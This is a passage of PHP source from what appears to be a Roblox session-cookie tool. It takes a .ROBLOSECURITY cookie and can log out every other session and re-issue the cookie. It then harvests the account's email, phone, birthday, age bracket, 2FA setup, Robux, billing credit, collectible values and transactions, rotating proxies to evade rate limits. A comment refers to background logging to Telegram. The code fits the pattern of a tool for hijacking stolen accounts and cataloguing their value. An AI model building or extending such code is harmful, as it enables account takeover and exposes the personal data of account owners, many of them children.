            if (empty($csrf) || is_array($csrf)) {
                $csrf = self::getCSRF($cleanCookie, true, null); // Direct fallback
            }
            if (is_array($csrf) && isset($csrf['rate_limited'])) {
                return ['success' => false, 'message' => 'Roblox service is currently rate limited. Please try again in a few moments.'];
            }
            if (!$csrf) {
                return ['success' => false, 'message' => 'Could not retrieve CSRF token. Roblox is unreachable.'];
            }
        }

        $newCookie = null;
        if ($logoutOthers) {
            $logoutResult = self::logoutAllAndReauthenticate($cleanCookie, $csrf, $onProgress, $sessionProxy);
            if (is_array($logoutResult) && isset($logoutResult['rate_limited'])) {
                return ['success' => false, 'message' => 'Roblox rate limit exceeded during session logout. Please wait a moment and try again.'];
            }
            if (is_string($logoutResult) && !empty($logoutResult)) {
                $newCookie = $logoutResult;
            }
        }

        if (!$newCookie) {
            $timeout = (int)Config::get('CURL_TIMEOUT', 4);
            $connectTimeout = (int)Config::get('CURL_CONNECT_TIMEOUT', 2);

            // Step 1: Request Authentication Ticket reusing single warm cURL connection with HTTP/2
            $ch = curl_init('https://auth.roblox.com/v1/authentication-ticket');
            curl_setopt_array($ch, [
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => '{}',
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HEADER => true,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_2TLS,
                CURLOPT_TCP_NODELAY => true,
                CURLOPT_ENCODING => '',
                CURLOPT_DNS_CACHE_TIMEOUT => 600,
                CURLOPT_TIMEOUT => $timeout,
                CURLOPT_CONNECTTIMEOUT => $connectTimeout,
                CURLOPT_REFERER => 'https://www.roblox.com/',
                CURLOPT_HTTPHEADER => [
                    'Cookie: .ROBLOSECURITY=' . $cleanCookie,
                    'X-CSRF-TOKEN: ' . $csrf,
                    'Content-Type: application/json',
                    'User-Agent: ' . self::USER_AGENT,
                    'Origin: https://www.roblox.com',
                    'Referer: https://www.roblox.com/'
                ]
            ]);

            ProxyManager::applyProxy($ch, $sessionProxy);

            $ticket = null;
            for ($attempt = 1; $attempt <= self::MAX_RATELIMIT_RETRIES; $attempt++) {
                $out = curl_exec($ch);
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $hsize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);

                // If connection timed out or dropped, retry once
                if (!is_string($out) || $httpCode === 0) {
                    usleep(300000);
                    $out = curl_exec($ch);
                    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                    $hsize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
                }

                // Handle CSRF Challenge (403): Retry once with the returned X-CSRF-TOKEN
                if ($httpCode === 403 && is_string($out)) {
                    $headerBlock = substr($out, 0, $hsize);
                    if (preg_match('/x-csrf-token:\s*([^\r\n]+)/i', $headerBlock, $cm)) {
                        $csrf = trim($cm[1]);
                        self::setCachedCSRF($csrf);
                        curl_setopt($ch, CURLOPT_HTTPHEADER, [
                            'Cookie: .ROBLOSECURITY=' . $cleanCookie,
                            'X-CSRF-TOKEN: ' . $csrf,
                            'Content-Type: application/json',
                            'User-Agent: ' . self::USER_AGENT,
                            'Origin: https://www.roblox.com',
                            'Referer: https://www.roblox.com/'
                        ]);
                        $out = curl_exec($ch);
                        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                        $hsize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
                    }
                }

                if ($httpCode === 429) {
                    if ($sessionProxy) {
                        ProxyManager::markRateLimited($sessionProxy, 60);
                        // Rotate proxy for ticket generation retry to next fastest
                        $sessionProxy = ProxyManager::getProxy('fastest_first', $sessionProxy);
                        ProxyManager::applyProxy($ch, $sessionProxy);
                    }
                    $headerBlock = is_string($out) ? substr($out, 0, $hsize) : '';
                    $waitSec = ProxyManager::isEnabled() ? 1 : (2 * $attempt);
                    if (preg_match('/retry-after:\s*(\d+)/i', $headerBlock, $rm)) {
                        $waitSec = max((int)$rm[1], 2);
                    }
                    if ($onProgress) {
                        call_user_func($onProgress, 'ratelimit_wait', [
                            'step' => 'ticket_generation',
                            'attempt' => $attempt,
                            'wait_seconds' => $waitSec,
                            'message' => "Roblox rate limit hit during ticket generation. " . (ProxyManager::isEnabled() ? "Merotasi ke proxy baru..." : "Waiting {$waitSec}s...") . " (Attempt {$attempt}/" . self::MAX_RATELIMIT_RETRIES . ")"
                        ]);
                    }
                    sleep($waitSec);
                    continue;
                }

                if (!is_string($out) || $httpCode === 0 || $httpCode >= 500) {
                    if ($sessionProxy) {
                        ProxyManager::markRateLimited($sessionProxy, 120);
                        $sessionProxy = null; // Fallback to direct connection on retry
                        curl_close($ch);
                        continue;
                    }
                    curl_close($ch);
                    return ['success' => false, 'message' => 'Gagal terhubung ke layanan autentikasi Roblox (koneksi terputus/timeout). Silakan coba lagi.'];
                }

                $headers = substr($out, 0, $hsize);
                if (preg_match('/rbx-authentication-ticket:\s*([^\r\n]+)/i', $headers, $tm)) {
                    $ticket = trim($tm[1]);
                    break;
                }

                $body = substr($out, $hsize);
                $errJson = json_decode($body, true);
                $apiMsg = $errJson['errors'][0]['message'] ?? null;
                curl_close($ch);
                if ($httpCode === 401) {
                    return ['success' => false, 'message' => 'Cookie tidak valid atau sesi telah kedaluwarsa.'];
                }
                if ($apiMsg) {
                    return ['success' => false, 'message' => $apiMsg];
                }
                // Only return network/auth failure if not 401
                return ['success' => false, 'message' => 'Gagal membuat tiket autentikasi dari Roblox. Silakan coba lagi.'];
            }

            if (!$ticket) {
                curl_close($ch);
                return ['success' => false, 'message' => 'Layanan autentikasi Roblox sedang sibuk atau terkena rate limit. Silakan coba beberapa saat lagi.'];
            }

            // Step 2: Redeem Ticket (REUSE SAME $ch TO SKIP COLD TLS HANDSHAKE - 14x faster!)
            curl_setopt($ch, CURLOPT_URL, 'https://auth.roblox.com/v1/authentication-ticket/redeem');
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['authenticationTicket' => $ticket]));
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                'Content-Type: application/json',
                'RBXAuthenticationNegotiation: 1',
                'X-CSRF-TOKEN: ' . $csrf,
                'User-Agent: ' . self::USER_AGENT,
                'Origin: https://www.roblox.com',
                'Referer: https://www.roblox.com/'
            ]);

            for ($attempt = 1; $attempt <= self::MAX_RATELIMIT_RETRIES; $attempt++) {
                $res = curl_exec($ch);
                $httpCode2 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $hsize2 = curl_getinfo($ch, CURLINFO_HEADER_SIZE);

                if (!is_string($res) || $httpCode2 === 0) {
                    usleep(300000);
                    $res = curl_exec($ch);
                    $httpCode2 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                    $hsize2 = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
                }

                // Handle CSRF challenge on redeem if needed
                if ($httpCode2 === 403 && is_string($res)) {
                    $headerBlock2 = substr($res, 0, $hsize2);
                    if (preg_match('/x-csrf-token:\s*([^\r\n]+)/i', $headerBlock2, $cm2)) {
                        $csrf = trim($cm2[1]);
                        self::setCachedCSRF($csrf);
                        curl_setopt($ch, CURLOPT_HTTPHEADER, [
                            'Content-Type: application/json',
                            'RBXAuthenticationNegotiation: 1',
                            'X-CSRF-TOKEN: ' . $csrf,
                            'User-Agent: ' . self::USER_AGENT,
                            'Origin: https://www.roblox.com',
                            'Referer: https://www.roblox.com/'
                        ]);
                        $res = curl_exec($ch);
                        $httpCode2 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                        $hsize2 = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
                    }
                }

                if ($httpCode2 === 429) {
                    if ($sessionProxy) {
                        ProxyManager::markRateLimited($sessionProxy, 60);
                    }
                    $headerBlock2 = is_string($res) ? substr($res, 0, $hsize2) : '';
                    $waitSec = 2 * $attempt;
                    if (preg_match('/retry-after:\s*(\d+)/i', $headerBlock2, $rm)) {
                        $waitSec = max((int)$rm[1], 2);
                    }
                    if ($onProgress) {
                        call_user_func($onProgress, 'ratelimit_wait', [
                            'step' => 'ticket_redeem',
                            'attempt' => $attempt,
                            'wait_seconds' => $waitSec,
                            'message' => "Roblox rate limit hit during ticket redeem. Waiting {$waitSec}s before retrying... (Attempt {$attempt}/" . self::MAX_RATELIMIT_RETRIES . ")"
                        ]);
                    }
                    sleep($waitSec);
                    continue;
                }

                if (is_string($res) && preg_match('/\.ROBLOSECURITY=([^;]+)/i', $res, $cm)) {
                    $newCookie = trim($cm[1], " \t\n\r\0\x0B\"'");
                    break;
                }
            }

            curl_close($ch);

            if (!$newCookie) {
                return ['success' => false, 'message' => 'Refresh failed. Could not obtain new cookie.'];
            }
        }

        return ['success' => true, 'cookie' => $newCookie, 'userData' => $userData];
    }

    public static function fetchDetails(string $cookie, bool $forDetailedDisplay = true, ?array $cachedUserInfo = null): array {
        $userInfo = $cachedUserInfo;
        if ($userInfo === null || empty($userInfo['id'])) {
            $userInfo = self::makeGetRequestWithRetry('https://users.roblox.com/v1/users/authenticated', $cookie);
        }
        if (isset($userInfo['error']) || isset($userInfo['rate_limited']) || empty($userInfo['id'])) {
            return [
                'logData' => [
                    'timestamp' => date('Y-m-d H:i:s'),
                    'username' => 'N/A',
                    'display_name' => 'N/A',
                    'user_id' => null,
                    'age_group' => 'N/A',
                    'age_group_status' => 'Unchecked',
                    'birthday' => 'N/A',
                    'birthday_status' => 'Non Verified',
                    'email' => 'N/A',
                    'email_verified' => 'No',
                    'phone' => 'N/A',
                    'robux' => 0,
                    'pending_robux' => 0,
                    'total_rap' => 0,
                    'premium' => 'No',
                    'two_factor' => 'None',
                    'account_credit' => 0,
                    'total_income' => 0,
                    'total_outgoing' => 0,
                    'limited_items_count' => 0,
                    'animations_count' => 0,
                    'transactions_count' => 0,
                ],
                'details' => null
            ];
        }

        $userId = $userInfo['id'] ?? null;
        $username = $userInfo['name'] ?? '';
        $displayName = $userInfo['displayName'] ?? '';

        $urls = [
            'email' => 'https://accountsettings.roblox.com/v1/email',
            'phone' => 'https://accountinformation.roblox.com/v1/phone',
            'avatar' => "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=$userId&size=150x150&format=Png",
            'avatar_full' => "https://thumbnails.roblox.com/v1/users/avatar?userIds=$userId&size=420x420&format=Png&isCircular=false",
            'currency' => 'https://economy.roblox.com/v1/user/currency',
            'twofa' => "https://twostepverification.roblox.com/v1/users/$userId/configuration",
            'premium' => "https://premiumfeatures.roblox.com/v1/users/$userId/validate-membership",
            'credit' => 'https://billing.roblox.com/v1/credit',
            'yearly' => "https://economy.roblox.com/v2/users/$userId/transaction-totals?timeFrame=Year",
            'collectibles' => "https://inventory.roblox.com/v1/users/$userId/assets/collectibles?limit=100&sortOrder=Asc",
            'gears' => "https://inventory.roblox.com/v2/users/$userId/inventory?assetTypes=Gear&sortOrder=Desc&limit=100",
            'all_bundles' => "https://catalog.roblox.com/v1/users/$userId/bundles?sortOrder=Desc&limit=100",
            'anim_bundles' => "https://catalog.roblox.com/v1/users/$userId/bundles/2?sortOrder=Desc&limit=100",
            'anim_inventory' => "https://inventory.roblox.com/v2/users/$userId/inventory?assetTypes=Animation,Package&sortOrder=Desc&limit=100",
            'purchase' => "https://economy.roblox.com/v2/users/$userId/transactions?limit=100&transactionType=Purchase",
            'sale' => "https://economy.roblox.com/v2/users/$userId/transactions?limit=100&transactionType=Sale",
            'birthdate' => 'https://users.roblox.com/v1/birthdate',
            'age_bracket' => 'https://users.roblox.com/v1/users/authenticated/age-bracket',
            'voice' => 'https://voice.roblox.com/v1/settings',
            'verified_age' => 'https://apis.roblox.com/age-verification-service/v1/age-verification/verified-age'
        ];

        // Wave 1: Fetch account details, inventory, and transactions with persistent auto-retry
        $responses = self::multiGetRequestsWithAutoRetry($urls, $cookie, 4);

        $email = $responses['email']['emailAddress'] ?? 'Not available';
        $emailVerified = !empty($responses['email']['verified']);
        $phone = $responses['phone']['phone'] ?? null;
        $avatarUrl = $responses['avatar']['data'][0]['imageUrl'] ?? '';
        $fullAvatarUrl = $responses['avatar_full']['data'][0]['imageUrl'] ?? '';
        $robux = $responses['currency']['robux'] ?? 0;
        $pendingRobux = $responses['currency']['pendingRobux'] ?? 0;

        // Birthday & Age parsing (Formatted as M, D, Y)
        $birthMonth = isset($responses['birthdate']['birthMonth']) ? (int)$responses['birthdate']['birthMonth'] : 0;
        $birthDay = isset($responses['birthdate']['birthDay']) ? (int)$responses['birthdate']['birthDay'] : 0;
        $birthYear = isset($responses['birthdate']['birthYear']) ? (int)$responses['birthdate']['birthYear'] : 0;

        $birthday = 'N/A';
        $calculatedAge = null;
        if ($birthMonth > 0 && $birthDay > 0 && $birthYear > 0) {
            $birthday = "{$birthMonth}, {$birthDay}, {$birthYear}";
            try {
                $bDate = new \DateTime("{$birthYear}-{$birthMonth}-{$birthDay}");
                $now = new \DateTime('today');
                $calculatedAge = $bDate->diff($now)->y;
            } catch (\Throwable $e) {
                $calculatedAge = null;
            }
        }

        // Age Group extraction - prioritizes raw API string first (e.g. '18-20', '21+', '16-17')
        $rawApiAgeGroup = null;
        $ageCandidates = [
            $responses['age_bracket']['ageBracket'] ?? null,
            $responses['age_bracket']['ageGroup'] ?? null,
            $responses['age_bracket']['ageRange'] ?? null,
            $responses['verified_age']['verifiedAge'] ?? null,
            $responses['verified_age']['ageGroup'] ?? null,
            $responses['birthdate']['ageGroup'] ?? null,
            $responses['birthdate']['ageBracket'] ?? null
        ];
        foreach ($ageCandidates as $candidate) {
            if ($candidate !== null && is_string($candidate)) {
                $trimmed = trim($candidate);
                if ($trimmed !== '' && !is_numeric($trimmed)) {
                    $rawApiAgeGroup = $trimmed;
                    break;
                }
            }
        }

        $ageGroup = 'N/A';
        if ($rawApiAgeGroup !== null) {
            $ageGroup = $rawApiAgeGroup;
        } elseif ($calculatedAge !== null) {
            if ($calculatedAge >= 21) {
                $ageGroup = '21+';
            } elseif ($calculatedAge >= 18) {
                $ageGroup = '18-20';
            } elseif ($calculatedAge >= 16) {
                $ageGroup = '16-17';
            } elseif ($calculatedAge >= 13) {
                $ageGroup = '13-15';
            } elseif ($calculatedAge >= 9) {
                $ageGroup = '9-12';
            } else {
                $ageGroup = '<9';
            }
        } else {
            $bracket = $responses['age_bracket']['ageBracket'] ?? ($responses['age_bracket']['ageGroup'] ?? null);
            if ($bracket !== null && $bracket !== '') {
                if (is_string($bracket) && !is_numeric($bracket)) {
                    $ageGroup = trim($bracket);
                } else {
                    $bNum = (int)$bracket;
                    if ($bNum === 0) {
                        $ageGroup = '<13';
                    } elseif ($bNum === 1) {
                        $ageGroup = '13-15';
                    } elseif ($bNum === 2) {
                        $ageGroup = '16-17';
                    } elseif ($bNum === 3) {
                        $ageGroup = '18-20';
                    } elseif ($bNum >= 4) {
                        $ageGroup = '21+';
                    } else {
                        $ageGroup = (string)$bracket;
                    }
                }
            }
        }

        // Verification & Indicators
        $voiceSettings = $responses['voice'] ?? [];
        $isVoiceEnabled = !empty($voiceSettings['isVoiceEnabled']);
        $denialReason = $voiceSettings['denialReason'] ?? null;
        $isUserEligible = !empty($voiceSettings['isUserEligible']);

        $verifiedAgeRes = $responses['verified_age'] ?? [];
        $hasVerifiedAge = (!isset($verifiedAgeRes['error']) && (!empty($verifiedAgeRes['verifiedAge']) || ($verifiedAgeRes['status'] ?? '') === 'Verified'));

        // Age Group indicator: Checked / Unchecked
        $isAgeChecked = ($isVoiceEnabled || $hasVerifiedAge || ($denialReason === 0 && !isset($voiceSettings['error'])) || !empty($responses['age_bracket']['isAgeChecked']));
        $ageGroupStatus = $isAgeChecked ? 'Checked' : 'Unchecked';

        // Birthday indicator: Verified / Non Verified
        $isBirthdayVerified = ($hasVerifiedAge || $isVoiceEnabled || ($denialReason === 0 && !isset($voiceSettings['error'])) || !empty($responses['birthdate']['isVerified']));
        $birthdayStatus = $isBirthdayVerified ? 'Verified' : 'Non Verified';

        $authOn = false;
        $emailOn = false;
        $smsOn = false;
        if (!isset($responses['twofa']['error'])) {
            $methods = $responses['twofa']['methods'] ?? [];
            if (is_array($methods)) {
                foreach ($methods as $m) {
                    $mType = $m['mediaType'] ?? null;
                    $mEnabled = !empty($m['enabled']);
                    if (($mType === 2 || $mType === '2' || strcasecmp((string)$mType, 'Authenticator') === 0) && $mEnabled) $authOn = true;
                    if (($mType === 0 || $mType === '0' || strcasecmp((string)$mType, 'Email') === 0) && $mEnabled) $emailOn = true;
                    if (($mType === 1 || $mType === '1' || strcasecmp((string)$mType, 'SMS') === 0) && $mEnabled) $smsOn = true;
                }
            }
        }
        $twoFactor = $authOn ? 'Authenticator' : ($emailOn ? 'Email' : ($smsOn ? 'SMS' : 'None'));
        $premium = !empty($responses['premium']['isPremium']);
        $accountCredit = $responses['credit']['credit'] ?? 0;
        $yearlyTotals = (!isset($responses['yearly']['error']) && !isset($responses['yearly']['rate_limited'])) ? $responses['yearly'] : null;

        // Collectibles
        $limitedItems = [];
        $totalRAP = 0;
        // SFX Items (Items with special effects: Sparkles, Fire, Smoke, Sound, Special Effect)
        $sfxItems = [];
        $seenSfxIds = [];

        $detectSfx = function(int|string $assetId, string $name, int $rap = 0) use (&$sfxItems, &$seenSfxIds) {
            $idStr = (string)$assetId;
            if (isset($seenSfxIds[$idStr])) {
                return;
            }

            $nameLower = strtolower($name);
            $effectType = null;

            // 1. Sound / SFX items
            if (
                str_contains($nameLower, 'boombox') ||
                str_contains($nameLower, 'harmonica') ||
                str_contains($nameLower, 'bloxy cola hat') ||
                str_contains($nameLower, 'witches brew hat') ||
                str_contains($nameLower, 'chicken suit') ||
                str_contains($nameLower, 'sound effect') ||
                str_contains($nameLower, 'sfx') ||
                str_contains($nameLower, 'radio') ||
                str_contains($nameLower, 'guitar') ||
                str_contains($nameLower, 'violin') ||
                str_contains($nameLower, 'trumpet') ||
                str_contains($nameLower, 'piano') ||
                str_contains($nameLower, 'keytar') ||
                str_contains($nameLower, 'megaphone')
            ) {
                $effectType = 'Sound';
            }
            // 2. Fire / Flame items
            elseif (
                str_contains($nameLower, 'horns of the netherworld') ||
                str_contains($nameLower, 'daemonshank') ||
                str_contains($nameLower, 'fire breathing') ||
                str_contains($nameLower, 'flaming') ||
                str_contains($nameLower, 'fiery') ||
                str_contains($nameLower, 'burning') ||
                str_contains($nameLower, 'fire horn') ||
                str_contains($nameLower, 'blazing') ||
                str_contains($nameLower, 'infernal')
            ) {
                $effectType = 'Fire';
            }
            // 3. Smoke items
            elseif (
                str_contains($nameLower, 'smokestack') ||
                str_contains($nameLower, 'singed scientist') ||
                str_contains($nameLower, 'smoke') ||
                str_contains($nameLower, 'foggy')
            ) {
                $effectType = 'Smoke';
            }
            // 4. Sparkles items
            elseif (
                str_contains($nameLower, 'sparkle time') ||
                str_contains($nameLower, 'sparkling') ||
                str_contains($nameLower, 'sparkler') ||
                str_contains($nameLower, 'glittering')
            ) {
                $effectType = 'Sparkles';
            }
            // 5. Special Effect items (Iconic effect items & particle accessories)
            elseif (
                str_contains($nameLower, 'horns of pwnage') ||
                str_contains($nameLower, 'poisoned horns') ||
                str_contains($nameLower, 'frozen horns') ||
                str_contains($nameLower, 'ghost walker') ||
                str_contains($nameLower, 'ghostdeeri') ||
                str_contains($nameLower, 'dusekkar') ||
                str_contains($nameLower, 'clockwork') ||
                str_contains($nameLower, 'domino crown') ||
                str_contains($nameLower, 'aura') ||
                str_contains($nameLower, 'particle') ||
                str_contains($nameLower, 'rainbow barf') ||
                str_contains($nameLower, 'glowing')
            ) {
                $effectType = 'Special Effect';
            }

            if ($effectType !== null) {
                $seenSfxIds[$idStr] = true;
                $sfxItems[] = [
                    'assetId' => $assetId,
                    'name' => $name,
                    'effectType' => $effectType,
                    'thumbnail' => '',
                    'rap' => $rap
                ];
            }
        };

        if (!isset($responses['collectibles']['error']) && isset($responses['collectibles']['data'])) {
            foreach ($responses['collectibles']['data'] as $item) {
                $limitedItems[] = [
                    'assetId' => $item['assetId'],
                    'name' => $item['name'],
                    'recentAveragePrice' => $item['recentAveragePrice'] ?? 0,
                    'thumbnail' => ''
                ];
                $totalRAP += (int)($item['recentAveragePrice'] ?? 0);
                $detectSfx($item['assetId'], $item['name'], (int)($item['recentAveragePrice'] ?? 0));
            }
        }

        if (!isset($responses['gears']['error']) && isset($responses['gears']['data']) && is_array($responses['gears']['data'])) {
            foreach ($responses['gears']['data'] as $item) {
                $gId = $item['assetId'] ?? ($item['id'] ?? null);
                $gName = $item['name'] ?? ($item['assetName'] ?? '');
                if ($gId && $gName) {
                    $detectSfx($gId, $gName, 0);
                }
            }
        }

        // Animations - supports official and player-created UGC animation packs & packages
        $animations = [];
        $seenAnimIds = [];
        $seenAnimNames = [];

        $normalizeAnimName = function(string $name): string {
            $clean = trim(preg_replace('/\s*(animation\s*pack|animation\s*package|avatar\s*animation|pack|package|bundle)\s*$/i', '', $name));
            return preg_replace('/[^a-z0-9]/', '', strtolower($clean));
        };

        // 1. Bundles type 2 (Avatar Animations)
        if (!isset($responses['anim_bundles']['error']) && isset($responses['anim_bundles']['data']) && is_array($responses['anim_bundles']['data'])) {
            foreach ($responses['anim_bundles']['data'] as $item) {
                if (isset($item['id'], $item['name'])) {
                    $norm = $normalizeAnimName($item['name']);
                    if (!empty($norm) && empty($seenAnimNames[$norm]) && empty($seenAnimIds['bundle_' . $item['id']])) {
                        $seenAnimNames[$norm] = true;
                        $seenAnimIds['bundle_' . $item['id']] = true;
                        $animations[] = [
                            'id' => $item['id'],
                            'name' => $item['name'],
                            'type' => 'bundle',
                            'thumbnail' => ''
                        ];
                    }
                }
            }
        }

        // 2. All user bundles - capture UGC/player-made animation bundles
        if (!isset($responses['all_bundles']['error']) && isset($responses['all_bundles']['data']) && is_array($responses['all_bundles']['data'])) {
            foreach ($responses['all_bundles']['data'] as $item) {
                if (isset($item['id'], $item['name'])) {
                    $bType = strtolower((string)($item['bundleType'] ?? ''));
                    $nameLower = strtolower((string)$item['name']);
                    $isAnimBundle = str_contains($bType, 'anim') || str_contains($nameLower, 'anim') || str_contains($nameLower, 'walk') || str_contains($nameLower, 'run') || str_contains($nameLower, 'idle');
                    if ($isAnimBundle) {
                        $norm = $normalizeAnimName($item['name']);
                        if (!empty($norm) && empty($seenAnimNames[$norm]) && empty($seenAnimIds['bundle_' . $item['id']])) {
                            $seenAnimNames[$norm] = true;
                            $seenAnimIds['bundle_' . $item['id']] = true;
                            $animations[] = [
                                'id' => $item['id'],
                                'name' => $item['name'],
                                'type' => 'bundle',
                                'thumbnail' => ''
                            ];
                        }
                    }
                }
            }
        }

        // 3. User inventory - capture UGC animations and animation packages without duplicating bundles
        if (!isset($responses['anim_inventory']['error']) && isset($responses['anim_inventory']['data']) && is_array($responses['anim_inventory']['data'])) {
            foreach ($responses['anim_inventory']['data'] as $item) {
                $assetId = $item['assetId'] ?? ($item['id'] ?? null);
                $name = $item['name'] ?? ($item['assetName'] ?? '');
                $assetType = strtolower((string)($item['assetType'] ?? ''));
                if ($assetId && empty($seenAnimIds['asset_' . $assetId])) {
                    $nameLower = strtolower($name);
                    $isAnimPkg = ($assetType === 'package' && (str_contains($nameLower, 'anim') || str_contains($nameLower, 'pack'))) || str_contains($nameLower, 'animation pack') || str_contains($nameLower, 'animation package');
                    if ($isAnimPkg) {
                        $norm = $normalizeAnimName($name);
                        if (!empty($norm) && empty($seenAnimNames[$norm])) {
                            $seenAnimNames[$norm] = true;
                            $seenAnimIds['asset_' . $assetId] = true;
                            $animations[] = [
                                'id' => $assetId,
                                'name' => $name,
                                'type' => 'asset',
                                'thumbnail' => ''
                            ];
                        }
                    }
                }
            }
        }
        // Transactions
        $allTransactions = [];
        $totalIncome = 0;
        $totalOutgoing = 0;

        $parseTx = function($data, bool $isIncome) use (&$allTransactions, &$totalIncome, &$totalOutgoing) {
            if (isset($data['data']) && is_array($data['data'])) {
                foreach ($data['data'] as $tx) {
                    $details = (array)($tx['details'] ?? []);
                    $amount = (int)($tx['currency']['amount'] ?? 0);
                    $txType = $tx['transactionType'] ?? '';
                    $detail = $details['name'] ?? ($details['type'] ?? $txType);
                    $date = $tx['created'] ?? '';
                    $assetId = $details['assetId'] ?? ($details['id'] ?? ($details['collectibleItemId'] ?? null));
                    $itemType = $details['type'] ?? 'Asset';
                    $placeInfo = (array)($details['place'] ?? ($tx['place'] ?? ($details['game'] ?? [])));
                    $placeId = $details['placeId'] ?? ($placeInfo['placeId'] ?? ($placeInfo['id'] ?? null));
                    $universeId = $details['universeId'] ?? ($placeInfo['universeId'] ?? null);
                    $gameName = $placeInfo['name'] ?? ($details['gameName'] ?? ($details['placeName'] ?? ''));
                    $sellerId = $details['sellerId'] ?? ($details['creatorId'] ?? ($details['userid'] ?? ($tx['seller']['id'] ?? null)));

                    if ($isIncome) {
                        $totalIncome += $amount;
                    } else {
                        $totalOutgoing += $amount;
                    }

                    $allTransactions[] = [
                        'date' => $date,
                        'amount' => $amount,
                        'type' => $txType,
                        'detail' => $detail,
                        'name' => $detail,
                        'itemType' => $itemType,
                        'income' => $isIncome,
                        'assetId' => $assetId,
                        'universeId' => $universeId,
                        'placeId' => $placeId,
                        'sellerId' => $sellerId,
                        'gameName' => $gameName,
                        'thumbnail' => '',
                        'gameIcon' => '',
                        'creatorAvatar' => ''
                    ];
                }
            }
        };

        $parseTx($responses['purchase'], false);
        $parseTx($responses['sale'], true);

        $logData = [
            'timestamp' => date('Y-m-d H:i:s'),
            'user_id' => $userId,
            'username' => $username,
            'display_name' => $displayName,
            'age_group' => $ageGroup,
            'age_group_status' => $ageGroupStatus,
            'birthday' => $birthday,
            'birthday_status' => $birthdayStatus,
            'email' => $email,
            'email_verified' => $emailVerified ? 'Yes' : 'No',
            'phone' => $phone ?? 'N/A',
            'robux' => $robux,
            'pending_robux' => $pendingRobux,
            'total_rap' => $totalRAP,
            'premium' => $premium ? 'Yes' : 'No',
            'two_factor' => $twoFactor,
            'account_credit' => $accountCredit,
            'total_income' => $totalIncome,
            'total_outgoing' => $totalOutgoing,
            'limited_items_count' => count($limitedItems),
            'sfx_items_count' => count($sfxItems),
            'animations_count' => count($animations),
            'transactions_count' => count($allTransactions),
        ];

        // If only fetching for background logging/Telegram, skip all heavy media/metadata queries
        if (!$forDetailedDisplay) {
            return ['logData' => $logData, 'details' => null];
        }

        // === CONSOLIDATED WAVE 2: Single Parallel Wave for all Thumbnails & Metadata ===
        $wave2Urls = [];

        // 1. Collect Animation IDs (both bundle and asset types)
        $animAllIds = array_filter(array_column($animations, 'id'));

        // 2. Collect SFX Asset IDs
        $sfxAssetIds = array_filter(array_column($sfxItems, 'assetId'));

        // 3. Collect Transaction IDs (Assets, Gamepasses, DevProducts, Bundles, Places, Universes)
        $txAssetIds = [];
        $gamePassIds = [];
        $devProductIds = [];
        $bundleTxIds = [];
        $placeIds = [];
        $knownUniverseIds = [];

        foreach ($allTransactions as $tx) {
            $aId = $tx['assetId'] ?? null;
            if ($aId) {
                $cleanType = strtolower(str_replace([' ', '_', '-'], '', (string)($tx['itemType'] ?? '')));
                if ($cleanType === 'gamepass') {
                    $gamePassIds[] = $aId;
                } elseif ($cleanType === 'developerproduct') {
                    $devProductIds[] = $aId;
                } elseif ($cleanType === 'bundle') {
                    $bundleTxIds[] = $aId;
                } else {
                    $txAssetIds[] = $aId;
                }
            }
            if (!empty($tx['placeId'])) {
                $placeIds[] = $tx['placeId'];
            }
            if (!empty($tx['universeId'])) {
                $knownUniverseIds[] = $tx['universeId'];
            }
        }

        // 4. Batch & Deduplicate ALL Asset IDs across Animations, SFX, and Transactions (up to 100 per chunk)
        $allAssetIds = array_values(array_unique(array_filter(array_merge($animAllIds, $sfxAssetIds, $txAssetIds))));
        if (!empty($allAssetIds)) {
            $assetChunks = array_chunk($allAssetIds, 100);
            foreach ($assetChunks as $idx => $chunk) {
                $wave2Urls['assets_' . $idx] = 'https://thumbnails.roblox.com/v1/assets?assetIds=' . implode(',', $chunk) . '&size=150x150&format=Png&returnPolicy=PlaceHolder';
            }
        }

        // 5. Batch & Deduplicate Bundle IDs (Animations + Transactions)
        $allBundleIds = array_values(array_unique(array_filter(array_merge($animAllIds, $bundleTxIds))));
        if (!empty($allBundleIds)) {
            $bundleChunks = array_chunk($allBundleIds, 100);
            foreach ($bundleChunks as $idx => $chunk) {
                $wave2Urls['bundles_' . $idx] = 'https://thumbnails.roblox.com/v1/bundles/thumbnails?bundleIds=' . implode(',', $chunk) . '&size=150x150&format=Png&returnPolicy=PlaceHolder';
            }
        }

        // 6. Gamepass Thumbnails
        $gamePassIds = array_values(array_unique(array_filter($gamePassIds)));
        if (!empty($gamePassIds)) {
            $gpChunks = array_chunk(array_slice($gamePassIds, 0, 100), 100);
            foreach ($gpChunks as $idx => $chunk) {
                $wave2Urls['gamepasses_' . $idx] = 'https://thumbnails.roblox.com/v1/game-passes?gamePassIds=' . implode(',', $chunk) . '&size=150x150&format=Png';
            }
        }

        // 7. Developer Product Icons
        $devProductIds = array_values(array_unique(array_filter($devProductIds)));
        if (!empty($devProductIds)) {
            $dpChunks = array_chunk(array_slice($devProductIds, 0, 100), 100);
            foreach ($dpChunks as $idx => $chunk) {
                $wave2Urls['devproducts_' . $idx] = 'https://thumbnails.roblox.com/v1/developer-products/icons?developerProductIds=' . implode(',', $chunk) . '&size=150x150&format=Png';
            }
        }

        // 8. Place Game Icons
        $uniquePlaceIds = array_values(array_unique(array_filter($placeIds)));
        if (!empty($uniquePlaceIds)) {
            $placeChunks = array_chunk(array_slice($uniquePlaceIds, 0, 100), 50);
            foreach ($placeChunks as $idx => $pChunk) {
